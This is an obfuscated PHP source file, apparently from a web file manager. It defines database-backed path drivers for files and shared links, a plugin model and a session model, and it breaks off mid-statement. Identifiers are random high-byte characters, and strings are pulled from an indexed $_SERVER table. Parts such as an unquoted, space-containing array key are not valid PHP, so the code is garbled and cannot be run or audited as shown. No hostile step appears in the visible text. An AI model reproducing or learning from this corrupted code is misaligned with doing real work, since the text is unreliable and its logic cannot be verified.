<?php
 goto b³ÍÎ·­Óâ; bè¦°‘¸–Ø: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Èí¾ú) { $this->pathParse = $Èí¾ú; $this->model = Model($_SERVER[® ¨Ä®ñ][1309]); } public function getPath($™Ö™‰ıâ) { return trim($™Ö™‰ıâ, $_SERVER[® ¨Ä®ñ][8]); } public function pathFather($¾¯–³ÆÛ) { $ºĞµ®–½ = $this->parse($¾¯–³ÆÛ); $ºĞµ®–½ = $this->infoSimple($¾¯–³ÆÛ); return $ºĞµ®–½ ? $ºĞµ®–½[$_SERVER[® ¨Ä®ñ][489]] : !1; } public function pathThis($æ¸ÜØ‡) { $«Ú¶´·’ = $this->infoSimple($æ¸ÜØ‡); return $«Ú¶´·’ ? $«Ú¶´·’[$_SERVER[® ¨Ä®ñ][32]] : !1; } public function getPathOuter($Œ­ç‰èÆ) { if (!$Œ­ç‰èÆ) { return $Œ­ç‰èÆ; } $ô™ÎÑ—­ = $this->parse($Œ­ç‰èÆ); return KodIO::make($ô™ÎÑ—­[$_SERVER[® ¨Ä®ñ][392]]); } public function copyFolderFromIO($úëéèª, $Ê°ƒ›”î, $áÙğœ›, $ÁÊ¡²¼, $ûÖôëÈú) { $â«¿×­İ = $this->model->copyFolderFromIO($úëéèª, $Ê°ƒ›”î, $áÙğœ›, $ÁÊ¡²¼, $ûÖôëÈú); return KodIO::make($â«¿×­İ); } public function isParentOf($‡á˜¥Ÿ¹, $»Í‚¾·Õ) { return $this->model->isParentOf($‡á˜¥Ÿ¹, $»Í‚¾·Õ); } public function mkfile($ªúÏŞšÛ, $£ÂÎŸ‘µ = '', $†¸Õ€ò = REPEAT_RENAME) { $Û«Æú†Ú =& $_SERVER[® ¨Ä®ñ]; $ƒå€Éó– = $this->parse($ªúÏŞšÛ); $ªúÏŞšÛ = $ƒå€Éó–[$Û«Æú†Ú[392]]; for ($ùñÌ×”± = 0; $ùñÌ×”± < count($ƒå€Éó–[$Û«Æú†Ú[1310]]); $ùñÌ×”±++) { $È†Ğ¼ = $ƒå€Éó–[$Û«Æú†Ú[1310]][$ùñÌ×”±]; if ($ùñÌ×”± == count($ƒå€Éó–[$Û«Æú†Ú[1310]]) - 1) { $ªúÏŞšÛ = $this->model->mkfile($ªúÏŞšÛ, $È†Ğ¼, $£ÂÎŸ‘µ, $†¸Õ€ò); break; } $ªúÏŞšÛ = $this->model->mkdir($ªúÏŞšÛ, $È†Ğ¼, REPEAT_SKIP); } return $this->getPathOuter($ªúÏŞšÛ); } public function mkdir($Âñ‡÷Èò, $ĞĞ»’”ˆ = REPEAT_SKIP) { $ãŒøŞÛĞ =& $_SERVER[® ¨Ä®ñ]; $÷çÆì = $this->parse($Âñ‡÷Èò); $Âñ‡÷Èò = $÷çÆì[$ãŒøŞÛĞ[392]]; for ($â§•ø™ = 0; $â§•ø™ < count($÷çÆì[$ãŒøŞÛĞ[1310]]); $â§•ø™++) { $†±Å»‘Ä = $÷çÆì[$ãŒøŞÛĞ[1310]][$â§•ø™]; $Âñ‡÷Èò = $this->model->mkdir($Âñ‡÷Èò, $†±Å»‘Ä, $ĞĞ»’”ˆ); } return $this->getPathOuter($Âñ‡÷Èò); } public function copyFile($ï˜ÉÀÔæ, $¥Ü£ Ê, $Í¤´æĞİ = REPEAT_REPLACE) { $ŠÒÕû·‚ =& $_SERVER[® ¨Ä®ñ]; $˜Ù¢‘Ş¦ = $this->parse($¥Ü£ Ê); $”¨«Âœç = $this->model->copy($ï˜ÉÀÔæ, $˜Ù¢‘Ş¦[$ŠÒÕû·‚[392]], $Í¤´æĞİ, $˜Ù¢‘Ş¦[$ŠÒÕû·‚[78]]); return $”¨«Âœç ? $this->getPathOuter($”¨«Âœç) : !1; } public function moveFile($Âƒ†», $Ê©£´ƒÖ, $§—’–›ò = REPEAT_REPLACE) { $¡ƒï¹±Á =& $_SERVER[® ¨Ä®ñ]; $ı¸ÎâˆÁ = $this->parse($Ê©£´ƒÖ); $–°ÄÎà· = $this->model->move($Âƒ†», $ı¸ÎâˆÁ[$¡ƒï¹±Á[392]], $§—’–›ò, $ı¸ÎâˆÁ[$¡ƒï¹±Á[78]]); return $–°ÄÎà· ? $this->getPathOuter($–°ÄÎà·) : !1; } public function copy($¶¦±Õ™, $›ßÛÍ , $¡å¨ÉÕ = REPEAT_REPLACE, $Š‚æãÅ = false) { $¼Ç¨ğ£¾ = $this->parse($›ßÛÍ ); $„÷ç‘± = $this->model->copy($¶¦±Õ™, $¼Ç¨ğ£¾[$_SERVER[® ¨Ä®ñ][392]], $¡å¨ÉÕ, $Š‚æãÅ); return $„÷ç‘± ? $this->getPathOuter($„÷ç‘±) : !1; } public function moveSameAllow() { } public function move($ú¹ºñÅÓ, $çßÁÅå“, $€ŞÙÇó» = REPEAT_REPLACE, $Ğ—©ÅÊô = false) { $°âäÇØ® = $this->parse($çßÁÅå“); $”ƒ›–æÅ = $this->model->move($ú¹ºñÅÓ, $°âäÇØ®[$_SERVER[® ¨Ä®ñ][392]], $€ŞÙÇó», $Ğ—©ÅÊô); return $”ƒ›–æÅ ? $this->getPathOuter($”ƒ›–æÅ) : !1; } public function remove($ñßá©Õ×, $ƒ½ëº‰ = true) { return $this->model->remove($ñßá©Õ×, $ƒ½ëº‰); } public function rename($¶Ø°Ò©Ò, $ğï²ñÛ¹) { $ş—ò™Êì = $this->model->rename($¶Ø°Ò©Ò, $ğï²ñÛ¹); return $ş—ò™Êì ? $this->getPathOuter($¶Ø°Ò©Ò) : $ş—ò™Êì; } public function size($‚©Ã¢Ã) { $©¼ğÓƒ‡ = $this->infoSimple($‚©Ã¢Ã); return $©¼ğÓƒ‡ ? $©¼ğÓƒ‡[$_SERVER[® ¨Ä®ñ][80]] : 0; } public function infoSimple($èâÉ’) { return $this->model->sourceInfo($èâÉ’); } public function info($¡§À†£Ç) { return $this->infoParse($¡§À†£Ç); } public function infoAuth($¤¡ëÜ¤ƒ) { return $this->infoParse($¤¡ëÜ¤ƒ, !1, !0); } public function infoWithChildren($ğï˜˜ı÷) { return $this->infoParse($ğï˜˜ı÷, !0); } protected function infoParse($™¢èÖŞæ, $ä£º›¾¸ = false, $Â¿˜¤  = false) { if (!$ä£º›¾¸) { return $this->model->pathInfo($™¢èÖŞæ, $Â¿˜¤ ); } return $this->model->pathInfoMore($™¢èÖŞæ); } public function infoFull($ïá‰€¶) { $ÎÛ¯Ê Å =& $_SERVER[® ¨Ä®ñ]; $ƒ”Â¶Ç = explode($ÎÛ¯Ê Å[8], $ïá‰€¶); $‚—ªé°À = implode($ÎÛ¯Ê Å[8], array_splice($ƒ”Â¶Ç, 1)); return $this->model->pathInfoByPath($ƒ”Â¶Ç[0], $‚—ªé°À); } public function hashSimple($Ûå‡Š‰ƒ) { $âÇÀğÉ¸ =& $_SERVER[® ¨Ä®ñ]; $ø”¤Ô÷™ = $this->infoWithChildren($Ûå‡Š‰ƒ); return $ø”¤Ô÷™[$âÇÀğÉ¸[163]][$âÇÀğÉ¸[170]]; } public function hashMd5($ŞÙÏÈ÷¤) { $å–Ñ‚² =& $_SERVER[® ¨Ä®ñ]; $ªõÛ¯À = $this->infoWithChildren($ŞÙÏÈ÷¤); return $ªõÛ¯À[$å–Ñ‚²[163]][$å–Ñ‚²[169]]; } public function exist($â¯ª˜¼É) { $•…ÇìŠ =& $_SERVER[® ¨Ä®ñ]; $ó–ª§» = $this->parse($â¯ª˜¼É); if (!$ó–ª§»[$•…ÇìŠ[78]]) { return $this->isFile($â¯ª˜¼É) || $this->isFolder($â¯ª˜¼É); } $Ê‹ËÔ¦Õ = array($•…ÇìŠ[393] => $ó–ª§»[$•…ÇìŠ[392]], $•…ÇìŠ[32] => $ó–ª§»[$•…ÇìŠ[78]]); $Õ€¬½ = $this->model->where($Ê‹ËÔ¦Õ)->find(); return $Õ€¬½ ? !0 : !1; } public function isFile($Ù• á³–) { $ÖËÒ°şé =& $_SERVER[® ¨Ä®ñ]; $ã€µÖâê = $this->infoSimple($Ù• á³–); return $ã€µÖâê && $ã€µÖâê[$ÖËÒ°şé[402]] == $ÖËÒ°şé[89] ? !1 : !0; } public function isFolder($ĞèîÃºÊ) { $„ûÃñŞ¶ =& $_SERVER[® ¨Ä®ñ]; $½ÀÒ¦¯è = $this->infoSimple($ĞèîÃºÊ); return $½ÀÒ¦¯è && $½ÀÒ¦¯è[$„ûÃñŞ¶[402]] == $„ûÃñŞ¶[89] ? !0 : !1; } public function listPath($™æÜ‹ÒŠ, $‰¬Ö˜ˆ = false) { $ïóÎ¥Æé =& $_SERVER[® ¨Ä®ñ]; if ($™æÜ‹ÒŠ == $ïóÎ¥Æé[12]) { return !1; } $ü˜ÆìŞÓ = array($ïóÎ¥Æé[393] => $™æÜ‹ÒŠ); if ($‰¬Ö˜ˆ) { return $this->model->listSource($ü˜ÆìŞÓ, -1); } return $this->model->listSource($ü˜ÆìŞÓ); } public function has($ î¹«ü, $¹¨Ôºğå = false, $Ñäœ»ü« = null) { $µŸ¢È¤å =& $_SERVER[® ¨Ä®ñ]; $‹ƒÌàÖÛ = $this->infoWithChildren($ î¹«ü); if ($¹¨Ôºğå) { return array($µŸ¢È¤å[203] => $‹ƒÌàÖÛ[$µŸ¢È¤å[203]], $µŸ¢È¤å[202] => $‹ƒÌàÖÛ[$µŸ¢È¤å[202]]); } return $Ñäœ»ü« ? $‹ƒÌàÖÛ[$µŸ¢È¤å[203]] : $‹ƒÌàÖÛ[$µŸ¢È¤å[202]]; } public function listAll($ÅêÍµÉ) { $óüÖ = IO::info($this->pathParse[$_SERVER[® ¨Ä®ñ][78]]); if (!$óüÖ) { return array(); } return $this->model->listAll($ÅêÍµÉ); } public function getContent($ó±·ƒ“) { return $this->model->getContent($ó±·ƒ“); } public function setContent($Ù‰‹Ó«, $¼ğ‹–º = '') { return $this->model->setContent($Ù‰‹Ó«, $¼ğ‹–º); } public function fileSubstr($òğ§„ªÓ, $Ôµ»Óè³, $ä²…åó«) { return $this->model->fileSubstr($òğ§„ªÓ, $Ôµ»Óè³, $ä²…åó«); } public function download($¾Ñ¡·†À, $¯¹…íà‚ = '') { $Âë¨Ø¶Å = get_path_father($¯¹…íà‚); $Ó‰µş±¼ = get_path_this($¯¹…íà‚); $øÅå¤³ı = $this->model->fileInfoGet($¾Ñ¡·†À); $õ¾¾¾Ù¨ = IO::copy($øÅå¤³ı[$_SERVER[® ¨Ä®ñ][78]], $Âë¨Ø¶Å, !1, $Ó‰µş±¼); return $õ¾¾¾Ù¨; } public function setModifyTime($Ûğµë¢, $Š›€Ï…  = '') { $µ×éöÂ =& $_SERVER[® ¨Ä®ñ]; if (!$Ûğµë¢) { return; } $this->model->where(array($µ×éöÂ[409] => $Ûğµë¢))->save(array($µ×éöÂ[86] => $Š›€Ï… )); } public function upload($Ï‚¿£ë³, $“…í˜, $’”á˜Ø = false, $™¢÷´¥“ = REPEAT_REPLACE) { $·÷Á¡Êù =& $_SERVER[® ¨Ä®ñ]; $ı¼¿¿”Ş = $this->parse($Ï‚¿£ë³); $½ùò½“ß = $this->model->addFile($ı¼¿¿”Ş[$·÷Á¡Êù[392]], $“…í˜, $ı¼¿¿”Ş[$·÷Á¡Êù[78]], $’”á˜Ø, $™¢÷´¥“); return $this->getPathOuter($½ùò½“ß); } public function uploadFileByID($Îø²Ôİ», $…Ğ‰İüÅ, $€ëîßİ˜) { $¿¡È¢ü© =& $_SERVER[® ¨Ä®ñ]; $Éñ¦—ä¡ = $this->parse($Îø²Ôİ»); $¥ìÔâŠò = $this->model->addFileByFileID($Éñ¦—ä¡[$¿¡È¢ü©[392]], $…Ğ‰İüÅ, $Éñ¦—ä¡[$¿¡È¢ü©[78]], $€ëîßİ˜); return $this->getPathOuter($¥ìÔâŠò); } public function addFileByRemote($˜¶ÑÊ, $„¯ÔØã, $Ãß™—Àà = array(), $„±’Ñ”… = '', $¶ §üıô) { $óÁŞä¨€ =& $_SERVER[® ¨Ä®ñ]; $èäß——Ê = $this->parse($˜¶ÑÊ); $„±’Ñ”… = empty($„±’Ñ”…) ? $èäß——Ê[$óÁŞä¨€[78]] : $„±’Ñ”…; $®‚•ï²± = $this->model->addFileByRemote($èäß——Ê[$óÁŞä¨€[392]], $„¯ÔØã, $„±’Ñ”…, $Ãß™—Àà, $¶ §üıô); return $this->getPathOuter($®‚•ï²±); } public function uploadLink($Õ ¶ıêØ, $¾Ñúõ€ = 0) { $½š®Ôæ˜ =& $_SERVER[® ¨Ä®ñ]; $ğó¬ƒŸÒ = $this->parse($Õ ¶ıêØ); $‘•¥Ô‹ = _get($GLOBALS[$½š®Ôæ˜[7]], $½š®Ôæ˜[1311]); $òÑÌ»œ = _get($GLOBALS[$½š®Ôæ˜[7]], $½š®Ôæ˜[1312]); $Õ ¶ıêØ = Model($½š®Ôæ˜[594])->createFileName($ğó¬ƒŸÒ[$½š®Ôæ˜[78]], $‘•¥Ô‹, $òÑÌ»œ); return IO::uploadLink($Õ ¶ıêØ, $¾Ñúõ€); } public function fileNameAuto($À¯¬Ç•–, $Æİ¨è‡², $ü§µ¬¹ = REPEAT_REPLACE, $ŞıİŠßş = false) { return $this->model->fileNameAuto($À¯¬Ç•–, $Æİ¨è‡², $ü§µ¬¹, $ŞıİŠßş); } public function fileNameExist($êÙú»«, $Å‹Æãê‚) { return $this->model->fileNameExist($êÙú»«, $Å‹Æãê‚); } protected function _fileOut($ªª†³ë, $äçï›Šˆ = false, $â»¥ğ„± = false, $²¿¦®ïÚ = '', $æòĞ‰· = false) { $ƒ×Ö´ÔŸ =& $_SERVER[® ¨Ä®ñ]; $Ç‹˜÷¿’ = $this->model->sourceInfo($ªª†³ë); if ($Ç‹˜÷¿’[$ƒ×Ö´ÔŸ[402]] == $ƒ×Ö´ÔŸ[89]) { header($ƒ×Ö´ÔŸ[1313]); die; } $ğòó¹À¥ = $this->model->fileInfoGet($ªª†³ë); $²¿¦®ïÚ = $ğòó¹À¥[$ƒ×Ö´ÔŸ[169]] ? $ğòó¹À¥[$ƒ×Ö´ÔŸ[169]] : $²¿¦®ïÚ; $«ãşÀ¯ = isset($GLOBALS[$ƒ×Ö´ÔŸ[1314]]) ? $GLOBALS[$ƒ×Ö´ÔŸ[1314]] : $Ç‹˜÷¿’[$ƒ×Ö´ÔŸ[32]]; if ($æòĞ‰·) { return IO::fileOutServer($ğòó¹À¥[$ƒ×Ö´ÔŸ[78]], $äçï›Šˆ, $«ãşÀ¯, $²¿¦®ïÚ); } IO::fileOut($ğòó¹À¥[$ƒ×Ö´ÔŸ[78]], $äçï›Šˆ, $«ãşÀ¯, $²¿¦®ïÚ); } public function fileOut($¾Æï³ÈÃ, $ˆùÁ·œ¨ = false, $µ®àÑ¨ = false, $†¥…º¤Æ = '') { $this->_fileOut($¾Æï³ÈÃ, $ˆùÁ·œ¨, $µ®àÑ¨, $†¥…º¤Æ); } public function fileOutServer($Ø¸äÂ®è, $ã¥óŸİº = false, $Û±íª¯¸ = false, $°Öİë€Ø = '') { $this->_fileOut($Ø¸äÂ®è, $ã¥óŸİº, $Û±íª¯¸, $°Öİë€Ø, !0); } protected function _fileOutImage($„Ò°¢Ã, $İäÔÃ = 250) { $€ú„Š÷Í =& $_SERVER[® ¨Ä®ñ]; $Ö…ĞÓ£ = $this->model->pathInfo($„Ò°¢Ã); if ($Ö…ĞÓ£[$€ú„Š÷Í[402]] == $€ú„Š÷Í[89]) { show_json($€ú„Š÷Í[1315] . $„Ò°¢Ã, !1); } $ªÑ”ä‘“ = $this->model->fileInfoGet($„Ò°¢Ã); $ªÑ”ä‘“[$€ú„Š÷Í[32]] = $Ö…ĞÓ£[$€ú„Š÷Í[32]]; $ªÑ”ä‘“[$€ú„Š÷Í[162]] = $Ö…ĞÓ£[$€ú„Š÷Í[162]]; $GLOBALS[$€ú„Š÷Í[1314]] = $ªÑ”ä‘“[$€ú„Š÷Í[32]]; $GLOBALS[$€ú„Š÷Í[161]] = $ªÑ”ä‘“; IO::fileOutImage($ªÑ”ä‘“[$€ú„Š÷Í[78]], $İäÔÃ); } public function fileOutImage($ºú¾¼, $ö×Ó†ÅÈ = 250) { $this->_fileOutImage($ºú¾¼, $ö×Ó†ÅÈ); } public function fileOutImageServer($ö¸Â¯Ÿ, $ó¯Å¿ş = 250) { $this->_fileOutImage($ö¸Â¯Ÿ, $ó¯Å¿ş); } public function link($ç•Ñç Ñ, $è‰¢ËüÔ = '') { $€…êª¶‡ = $this->model->fileInfoGet($ç•Ñç Ñ); return IO::link($€…êª¶‡[$_SERVER[® ¨Ä®ñ][78]], $è‰¢ËüÔ); } protected function parse($²¤Üƒ©) { $ä¾Úâ–  =& $_SERVER[® ¨Ä®ñ]; if (strstr($²¤Üƒ©, $ä¾Úâ– [8]) === !1) { return array($ä¾Úâ– [411] => intval($²¤Üƒ©), $ä¾Úâ– [78] => $ä¾Úâ– [12], $ä¾Úâ– [1310] => array()); } $…û¨ˆ = explode($ä¾Úâ– [8], trim($²¤Üƒ©, $ä¾Úâ– [8])); if (count($…û¨ˆ) < 2) { show_tips(clear_html($²¤Üƒ©) . $ä¾Úâ– [1316]); } return array($ä¾Úâ– [411] => intval($…û¨ˆ[0]), $ä¾Úâ– [78] => $…û¨ˆ[1], $ä¾Úâ– [1310] => array_slice($…û¨ˆ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($ˆ¦üÄ°è) { $this->pathParse = $ˆ¦üÄ°è; $this->model = Model($_SERVER[® ¨Ä®ñ][1309]); } public function getPathOuter($¨à ÊôÌ) { $¢ô„¼ğÆ =& $_SERVER[® ¨Ä®ñ]; if (!$¨à ÊôÌ) { return $¨à ÊôÌ; } $ğª’¡¯´ = $this->parse($¨à ÊôÌ); return trim(KodIO::makeShare($this->pathParse[$¢ô„¼ğÆ[392]], $ğª’¡¯´[$¢ô„¼ğÆ[392]]), $¢ô„¼ğÆ[8]); } protected function infoParse($€ûµ˜ı¨, $É“Šı”ã = false, $Ñ©…¥€è = false) { $”˜ÈÁß =& $_SERVER[® ¨Ä®ñ]; $ ¯‰é×ç = $this->pathParse[$”˜ÈÁß[392]]; $¥Ä©¸ã’ = trim($this->pathParse[$”˜ÈÁß[1151]], $”˜ÈÁß[8]); return Action($”˜ÈÁß[1317])->sharePathInfo($ ¯‰é×ç, $¥Ä©¸ã’, $É“Šı”ã); } public function infoFull($õ•ğŸÇå) { $¡®”«¤­ =& $_SERVER[® ¨Ä®ñ]; $¨ĞÉ¯‰¥ = explode($¡®”«¤­[8], trim($õ•ğŸÇå, $¡®”«¤­[8])); if (count($¨ĞÉ¯‰¥) > 1) { $´‘Û¯èğ = implode($¡®”«¤­[8], array_splice($¨ĞÉ¯‰¥, 1)); $ÉÛ¯š´Õ = $this->model->pathInfoByPath($¨ĞÉ¯‰¥[0], $´‘Û¯èğ); if (!$ÉÛ¯š´Õ) { return !1; } $this->pathParse[$¡®”«¤­[1151]] = $ÉÛ¯š´Õ[$¡®”«¤­[394]]; } return $this->infoParse($õ•ğŸÇå); } public function listAll($éñƒõâ’) { $ŒËŸêßÛ =& $_SERVER[® ¨Ä®ñ]; $®’”›ËŸ = IO::info($this->pathParse[$ŒËŸêßÛ[78]]); if (!$®’”›ËŸ) { return array(); } $›ÉşË® = $this->model->listAll($éñƒõâ’); $™«Øèú‹ = Model($ŒËŸêßÛ[586])->getInfo($®’”›ËŸ[$ŒËŸêßÛ[479]]); $³°±××¬ = Action($ŒËŸêßÛ[1317]); foreach ($›ÉşË® as &$¶şõÎíÅ) { check_abort(); $¶şõÎíÅ[$ŒËŸêßÛ[87]] = $³°±××¬->_shareItemeParse($¶şõÎíÅ[$ŒËŸêßÛ[87]], $™«Øèú‹); } unset($¶şõÎíÅ); return $›ÉşË®; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($°ª¬çà˜) { $this->pathParse = $°ª¬çà˜; $this->model = Model($_SERVER[® ¨Ä®ñ][1309]); } protected function infoParse($ÑòÌ, $Ğ‘ÓÑèı = false, $úëšÓÄİ = false) { $ì—æ·÷º =& $_SERVER[® ¨Ä®ñ]; return Action($ì—æ·÷º[1157])->sharePathInfo($this->pathParse[$ì—æ·÷º[78]], !0, $Ğ‘ÓÑèı); } public function listPath($¶úœ‘Û, $Ã¸„¸ = false) { $å¾ü¯ø« =& $_SERVER[® ¨Ä®ñ]; $„»½ëïÏ = parent::listPath($¶úœ‘Û, $Ã¸„¸); if (!$„»½ëïÏ) { return $„»½ëïÏ; } if (is_array($„»½ëïÏ[$å¾ü¯ø«[1318]])) { $„»½ëïÏ[$å¾ü¯ø«[1318]] = Action($å¾ü¯ø«[1157])->shareItemInfo($„»½ëïÏ[$å¾ü¯ø«[1318]]); } foreach ($„»½ëïÏ as $ºÒÒİ¥” => $é£ôÈ¢©) { if (!in_array($ºÒÒİ¥”, array($å¾ü¯ø«[76], $å¾ü¯ø«[77]))) { continue; } foreach ($é£ôÈ¢© as $•èä™šß => $ÄÛÒÍÃÔ) { $„»½ëïÏ[$ºÒÒİ¥”][$•èä™šß] = Action($å¾ü¯ø«[1157])->shareItemInfo($ÄÛÒÍÃÔ); } } return $„»½ëïÏ; } public function listAll($©è±·Öœ) { $¡Š·­¶à =& $_SERVER[® ¨Ä®ñ]; $İœÀ·ä× = IO::info($this->pathParse[$¡Š·­¶à[78]]); if (!$İœÀ·ä×) { return array(); } $ÍÒ¶ó†» = $this->model->listAll($©è±·Öœ); foreach ($ÍÒ¶ó†» as &$Ü±­òÁ) { $Ü±­òÁ[$¡Š·­¶à[87]] = Action($¡Š·­¶à[1157])->shareItemInfo($Ü±­òÁ[$¡Š·­¶à[87]]); } unset($Ü±­òÁ); return $ÍÒ¶ó†»; } } goto Eì«Ÿ‘«„±; A­óÎñÓ½: class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\155\x2e\160\154\x75\147\x69\x6e\114\x69\163\x74"; public $field = array("\x6e\141\x6d\x65", "\x73\x74\x61\x74\x75\x73", "\x72\x65\147\x69\145\x73\x74", "\x63\x6f\156\x66\151\x67"); public function loadList($­êÇ”§¼ = false) { $â¯œ¸Ó = array_to_keyvalue($this->listData(), $_SERVER[® ¨Ä®ñ][32]); if ($­êÇ”§¼) { return $â¯œ¸Ó[$­êÇ”§¼]; } return $â¯œ¸Ó; } public function init() { $ÂŞ±® =& $_SERVER[® ¨Ä®ñ]; Hook::trigger($ÂŞ±®[1924]); $×ÕâµÙ = $this->loadPluginList(); foreach ($×ÕâµÙ as $­„ÇÈÕó => $ªíŸ¨ñü) { $ôŞ›œíã = $this->appAllow($­„ÇÈÕó, $ªíŸ¨ñü); if (!$ôŞ›œíã) { continue; } foreach ($ªíŸ¨ñü[$ÂŞ±®[1925]] as $Ê½¬–Úğ => $«ãÑÕ¿¹) { Hook::bind($Ê½¬–Úğ, $«ãÑÕ¿¹); } } Hook::trigger($ÂŞ±®[1926]); Hook::trigger(ACTION); } public function appAllow($¬àÍ¬çï, $‰‘”äı¯, $ã”ëé„¡ = true) { $¯³şŞ¯© =& $_SERVER[® ¨Ä®ñ]; $·˜ñÓÔ = PLUGIN_DIR . $¬àÍ¬çï . $¯³şŞ¯©[1927]; if (!is_array($‰‘”äı¯) || !is_array($‰‘”äı¯[$¯³şŞ¯©[1925]]) || $‰‘”äı¯[$¯³şŞ¯©[732]] != 1 || !is_file($·˜ñÓÔ)) { return !1; } if ($GLOBALS[$¯³şŞ¯©[496]] == 1) { return !0; } if ($ã”ëé„¡ && !Action($¯³şŞ¯©[1928])->checkAuth($¬àÍ¬çï)) { return !1; } return !0; } public function unInstall($‡ÙŒ¯íï) { $ÇÄ±ğ±§ =& $_SERVER[® ¨Ä®ñ]; $¥»•÷“¢ = $this->loadList($‡ÙŒ¯íï); if (file_exists(PLUGIN_DIR . $‡ÙŒ¯íï)) { Hook::apply($‡ÙŒ¯íï . $ÇÄ±ğ±§[1929]); } $this->remove($¥»•÷“¢[$ÇÄ±ğ±§[392]]); } public function changeStatus($óË‰¹ÆÙ, $·ÛŞ‚îÁ) { $í·Œ£… =& $_SERVER[® ¨Ä®ñ]; $Á†‘È¤Ü = $this->loadList($óË‰¹ÆÙ); if ($·ÛŞ‚îÁ) { Hook::apply($óË‰¹ÆÙ . $í·Œ£…[1930]); } $this->update($Á†‘È¤Ü[$í·Œ£…[392]], array($í·Œ£…[1931] => $·ÛŞ‚îÁ)); } public function appRegist($ıíâûç‡, $ÉÑÃìÕÈ) { $í´µÙÕĞ =& $_SERVER[® ¨Ä®ñ]; $Ùñˆ» = $this->loadList($ıíâûç‡); if ($Ùñˆ») { $this->update($Ùñˆ»[$í´µÙÕĞ[392]], array($í´µÙÕĞ[1925] => $ÉÑÃìÕÈ)); } else { $¸ºğµÕî = array($í´µÙÕĞ[32] => $ıíâûç‡, $í´µÙÕĞ[1925] => $ÉÑÃìÕÈ, $í´µÙÕĞ[732] => 0, $í´µÙÕĞ[6] => $this->getConfigDefault($ıíâûç‡)); $this->insert($¸ºğµÕî); } } public function getConfigDefault($ãú“ô­â) { $š’£éÏí =& $_SERVER[® ¨Ä®ñ]; $ĞÒÎºä = array(); $¯øÊ©Š = $this->getPackageJson($ãú“ô­â); if (!$¯øÊ©Š && is_array($¯øÊ©Š[$š’£éÏí[1932]])) { return $ĞÒÎºä; } foreach ($¯øÊ©Š[$š’£éÏí[1932]] as $ê›‚÷¿õ => $îé€™ş£) { if (!isset($îé€™ş£[$š’£éÏí[369]]) || isset($ĞÒÎºä[$ê›‚÷¿õ])) { continue; } $ĞÒÎºä[$ê›‚÷¿õ] = $îé€™ş£[$š’£éÏí[369]]; } return $ĞÒÎºä; } public function getPackageJson($ˆáàœ­) { return Hook::apply($ˆáàœ­ . $_SERVER[® ¨Ä®ñ][1933]); } public function getConfig($õÑ‘¦„¢, $Ã¡†Ïù¤ = false) { $’ò„ãÆü =& $_SERVER[® ¨Ä®ñ]; $ƒñü¹ô = array(); $öìš’ê¿ = $this->loadList($õÑ‘¦„¢); if ($öìš’ê¿ && is_array($öìš’ê¿[$’ò„ãÆü[6]])) { $ƒñü¹ô = $öìš’ê¿[$’ò„ãÆü[6]]; } if (!$ƒñü¹ô || $Ã¡†Ïù¤) { $ƒñü¹ô = $this->getConfigDefault($õÑ‘¦„¢); } return $ƒñü¹ô; } public function setConfig($¯ÑÕÔÕ•, $‘¹ƒÈá = false) { $Ä›ÏÑ£‹ =& $_SERVER[® ¨Ä®ñ]; $Ë®Øñ€ó = $this->loadList($¯ÑÕÔÕ•); if (!$Ë®Øñ€ó) { return !1; } $ğÊÅÉı = $Ë®Øñ€ó[$Ä›ÏÑ£‹[6]]; if ($‘¹ƒÈá == !1) { $ğÊÅÉı = array(); $‘¹ƒÈá = $this->getConfigDefault($¯ÑÕÔÕ•); } foreach ($‘¹ƒÈá as $ãŒ­©¶« => $ªÜ÷ô’Ù) { $ğÊÅÉı[$ãŒ­©¶«] = is_string($ªÜ÷ô’Ù) ? trim($ªÜ÷ô’Ù) : $ªÜ÷ô’Ù; } $this->update($Ë®Øñ€ó[$Ä›ÏÑ£‹[392]], array($Ä›ÏÑ£‹[6] => $ğÊÅÉı)); } public function viewList() { $ü£âĞÊ =& $_SERVER[® ¨Ä®ñ]; $í÷ˆãêÎ = $this->loadList(); $this->pluginScan($í÷ˆãêÎ); $í÷ˆãêÎ = $this->loadPluginList(); $øõš‰°Ë = array(); foreach ($í÷ˆãêÎ as $÷ú×é´Ü => $‹õ½ıŠ¢) { unset($‹õ½ıŠ¢[$ü£âĞÊ[1925]], $‹õ½ıŠ¢[$ü£âĞÊ[6]]); $Æ®í¤²š = PLUGIN_DIR . $‹õ½ıŠ¢[$ü£âĞÊ[32]] . $ü£âĞÊ[1927]; if (!is_file($Æ®í¤²š)) { continue; } $×ú¸¨³ã = Hook::apply($‹õ½ıŠ¢[$ü£âĞÊ[32]] . $ü£âĞÊ[1933]); if (is_array($×ú¸¨³ã)) { $øõš‰°Ë[$÷ú×é´Ü] = array_merge($‹õ½ıŠ¢, $×ú¸¨³ã); } } return $øõš‰°Ë; } private function loadPluginList() { $¤Åì§ªø =& $_SERVER[® ¨Ä®ñ]; $ãÍ±îÜ = $this->loadList(); if (strtolower(MOD) == $¤Åì§ªø[1934]) { return $ãÍ±îÜ; } $—Ç¡«ô = Hook::trigger($¤Åì§ªø[1935], $ãÍ±îÜ); if ($ãÍ±îÜ && !$—Ç¡«ô) { die; } return $—Ç¡«ô ? $—Ç¡«ô : $ãÍ±îÜ; } private function pluginScan($ÊØÆÁÁ§) { $ä–—¯£ƒ =& $_SERVER[® ¨Ä®ñ]; recursion_dir(PLUGIN_DIR, $×âµ¿…, $ºâì×â, 0); foreach ($×âµ¿… as $‡Æíò­ó) { $ÃàÃñª = get_path_this($‡Æíò­ó); if (isset($ÊØÆÁÁ§[$ÃàÃñª]) || !file_exists($‡Æíò­ó . $ä–—¯£ƒ[1936]) || !file_exists($‡Æíò­ó . $ä–—¯£ƒ[1927])) { continue; } Hook::apply($ÃàÃñª . $ä–—¯£ƒ[1930]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\145\155\137\x73\x65\x73\x73\151\157\x6e"; public function get($ÈŠàäÌ) { $ŸÎˆƒÇ¢ =& $_SERVER[® ¨Ä®ñ]; $ÄÀÀÏŸÓ = $this->where(array($ŸÎˆƒÇ¢[1937] => $ÈŠàäÌ))->find(); if (!is_array($ÄÀÀÏŸÓ)) { return !1; } return $ÄÀÀÏŸÓ[$ŸÎˆƒÇ¢[737]]; } public function set($ «úó©Ë, $‡èÑôêñ, $óçÏÆ©´ = 3600) { $æÚçÃ»Û =& $_SERVER[® ¨Ä®ñ]; $ğèùóàÃ = array($æÚçÃ»Û[1937] => $ 